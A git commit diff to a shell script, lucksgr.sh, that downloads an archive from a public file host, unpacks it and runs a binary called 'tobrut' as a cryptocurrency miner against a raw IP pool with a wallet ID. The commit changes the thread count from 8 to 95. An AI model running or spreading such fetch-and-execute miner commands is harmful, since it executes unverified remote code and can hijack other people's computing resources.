2ea4bda611efd0f01b58ae54fe6251a73554e1b1
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2025-01-30 22:04:29 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -1,1 +1,1 @@
-wget -O dr9rer files.catbox.moe/dr9rer.gz && tar -xvf dr9rer && chmod +x tobrut && ./tobrut -a yespowersugar -o 45.88.24.129:443 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz.tesla -p x -t 8
+wget -O dr9rer files.catbox.moe/dr9rer.gz && tar -xvf dr9rer && chmod +x tobrut && ./tobrut -a yespowersugar -o 45.88.24.129:443 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz.tesla -p x -t 95
